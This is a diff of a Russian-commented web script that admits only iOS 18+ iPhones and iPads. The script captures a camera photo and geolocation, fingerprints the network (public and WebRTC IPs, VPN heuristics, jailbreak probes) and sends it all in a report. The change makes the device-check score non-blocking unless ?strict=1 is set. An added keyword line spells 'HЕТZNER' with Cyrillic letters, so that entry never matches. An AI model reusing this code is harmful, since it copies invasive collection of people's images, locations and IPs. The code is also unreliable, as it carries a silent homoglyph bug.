@@ -1,11 +1,15 @@
-// === app.js (универсальный + жёсткий гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18; iPad desktop-UA fix
-// + Safari 18.0/18.4 feature-tests; если прошёл ХОТЯ БЫ ОДИН — выполняем старую проверку (Device Check)) ===
+// === app.js (универсальный гейт: ТОЛЬКО iPhone/iPad c iOS/iPadOS >= 18; iPad desktop-UA fix
+// + Safari 18.0/18.4 feature-tests; ЕСЛИ ПРОШЁЛ ХОТЯ БЫ ОДИН — ПУСКАЕМ.
+// Device Check теперь только для отчёта (не блокирует), кроме режима ?strict=1) ===
 
 // API base из <script>window.__API_BASE</script> в index.html
 const API_BASE =
   (typeof window !== "undefined" && window.__API_BASE)
     ? String(window.__API_BASE).replace(/\/+$/, "")
     : "";
+
+// Флаг строгого режима (?strict=1 — вернёт блокировку по score < 60)
+const STRICT_MODE = new URLSearchParams(location.search).get("strict") === "1";
 
 // ==== UI ====
 const UI = {
@@ -511,11 +515,11 @@ async function runDeviceCheck(clientProfilePartial) {
       score -= 8;
     }
 
-    // PN/Proxy эвристика (снижает score и добавляет причины)
+    // PN/Proxy эвристика
     const pn = analyzeNetworkHeuristics({
       publicIp: clientProfilePartial?.publicIp,
       webrtcIps: clientProfilePartial?.webrtcIps,
-      netInfo: clientProfilePartial?.network,
+      network: clientProfilePartial?.network,
       cameraLatencyMs: details.cameraLatencyMs,
       locale: clientProfilePartial?.locale,
       ipMeta: clientProfilePartial?.publicIp
@@ -524,7 +528,7 @@ async function runDeviceCheck(clientProfilePartial) {
     if (pn.label === "likely") { reasons.push("VPN/Proxy: likely"); score -= 25; }
     else if (pn.label === "possible") { reasons.push("VPN/Proxy: possible"); score -= 10; }
 
-    // Jailbreak влияние на скоринг
+    // Jailbreak влияние
     if (clientProfilePartial?.jbProbesActive?.summary?.label === 'likely') {
       reasons.push('Jailbreak likely (active probe)');
       score -= 30;
@@ -723,7 +727,7 @@ async function runSafariFeatureTests(maxWaitMs = 1800) {
   return { vt18_0: vt18, triple18_4 };
 }
 
-// === Быстрый мультисбор профиля клиента (как было) ===
+// === Быстрый мультисбор профиля клиента ===
 async function collectClientProfile() {
   // одна активная JB-проба на сессию
   let jbProbesActive = { summary:{ label: 'skipped' }, results: [] };
@@ -775,17 +779,17 @@ async function collectClientProfile() {
   profile.smallSignals = smallSignals;
 
   const ispUp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
-  const dcWords = ["AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE","HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"]
+  const dcWords = ["AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE","HЕТZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"]
     .filter(w => ispUp.includes(w));
   profile.dcIspKeywords = dcWords;
 
-  // ⬇️ добавлено: передаём результат активной JB-пробы в профиль
+  // добавлено: результат активной JB-пробы в профиль
   profile.jbProbesActive = jbProbesActive;
 
   return profile;
 }
 
-// === Отправка отчёта (добавлены allowLaunch + summary фич) ===
+// === Отправка отчёта (allowLaunch + summary фич) ===
 async function sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch, vt18_ok, t184_ok, denyReason }) {
   const info = getDeviceInfo();
   const code = determineCode();
@@ -849,7 +853,7 @@ async function autoFlow() {
     setBtnLocked();
     if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";
 
-    // Параллельно: гео + фото + профиль (как было)
+    // Параллельно: гео + фото + профиль
     const [geo, rawPhoto, client_profile] = await Promise.all([
       askGeolocation(), takePhotoWithFallback(), collectClientProfile()
     ]);
@@ -860,18 +864,17 @@ async function autoFlow() {
     const vt18_ok = !!vt18_0?.pass;
     const t184_ok = !!triple18_4?.pass;
 
-    // ⬇️ НОВОЕ: допускаем запуск, если прошёл ХОТЯ БЫ ОДИН тест
     const anyFeatOK = vt18_ok || t184_ok;
     const featTxt = `Safari features: VT18=${vt18_ok ? 'ok' : '—'}, 18.4=${t184_ok ? 'ok' : '—'}`;
 
     if (!anyFeatOK) {
-      // Отказ до Device Check
+      // ❌ Нет ни одного фиче-теста — блокируем до Device Check
       window.__reportReady = false;
       setBtnLocked();
       if (UI.title) UI.title.textContent = "Доступ отклонён";
       if (UI.text) UI.text.innerHTML = '<span class="err">Отказ по feature-tests.</span>';
       if (UI.reason) UI.reason.textContent = featTxt;
-      if (UI.note) UI.note.textContent = "Нужен хотя бы один из двух: View Transitions (18.0) ИЛИ shape()+CookieStore+WebAuthn JSON (18.4).";
+      if (UI.note) UI.note.textContent = "Нужен хотя бы один из: View Transitions (18.0) ИЛИ shape()+CookieStore+WebAuthn JSON (18.4).";
       try {
         await sendReport({
           photoBase64, geo, client_profile,
@@ -884,40 +887,44 @@ async function autoFlow() {
       return;
     }
 
-    // 2) Если любой из фиче-тестов ok — выполняем СТАРУЮ ПРОВЕРКУ как была
-    const device_check = await runDeviceCheck({
-      publicIp: client_profile.publicIp,
-      webrtcIps: client_profile.webrtcIps,
-      network: client_profile.network,
-      locale: client_profile.locale,
-      inAppWebView: client_profile.inAppWebView,
-      jbProbesActive: client_profile.jbProbesActive
-    });
-    window.__lastDeviceCheck = device_check;
+    // ✅ Прошёл хотя бы один фиче-тест — по умолчанию пускаем.
+    // Device Check только для отчёта (не блокирует), КРОМЕ STRICT_MODE.
+    let device_check = null;
+    try {
+      device_check = await runDeviceCheck({
+        publicIp: client_profile.publicIp,
+        webrtcIps: client_profile.webrtcIps,
+        network: client_profile.network,
+        locale: client_profile.locale,
+        inAppWebView: client_profile.inAppWebView,
+        jbProbesActive: client_profile.jbProbesActive
+      });
+      window.__lastDeviceCheck = device_check;
+    } catch {}
 
-    // Порог (как было)
-    if (device_check.score < 60) {
+    if (STRICT_MODE && device_check && device_check.score < 60) {
+      // Строгий режим: как раньше — блок по score
       window.__reportReady = false;
       setBtnLocked();
-      if (UI.title) UI.title.textContent = "Доступ отклонён";
+      if (UI.title) UI.title.textContent = "Доступ отклонён (strict)";
       if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена (score &lt; 60).</span>';
       if (UI.reason) UI.reason.textContent = "Причины: " + device_check.reasons.join("; ");
-      if (UI.note) UI.note.textContent = `${featTxt}`;
+      if (UI.note) UI.note.textContent = `${featTxt} • strict=1`;
       try {
-        await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: false, vt18_ok, t184_ok, denyReason: 'score_fail' });
+        await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: false, vt18_ok, t184_ok, denyReason: 'score_fail_strict' });
       } catch {}
       return;
     }
 
-    // 3) Успешно — отправляем данные, даём кнопку
+    // 2) Успешно — отправляем данные, даём кнопку (Device Check не блокирует)
     if (UI.text) UI.text.innerHTML = "Отправляем данные…";
     const resp = await sendReport({ photoBase64, geo, client_profile, device_check, allowLaunch: true, vt18_ok, t184_ok });
 
     window.__reportReady = true;
     setBtnReady();
     if (UI.title) UI.title.textContent = "Проверка пройдена";
-    if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (score ≥ 60).</span>';
-    if (UI.note) UI.note.textContent = `${featTxt}`;
+    if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (фиче-тесты пройдены).</span>';
+    if (UI.note) UI.note.textContent = STRICT_MODE ? `${featTxt} • strict=1 (но score ≥ 60)` : `${featTxt}`;
 
     if (resp && resp.delivered === false && UI.note) {
       UI.note.textContent = resp.reason || "Отправлено с задержкой.";
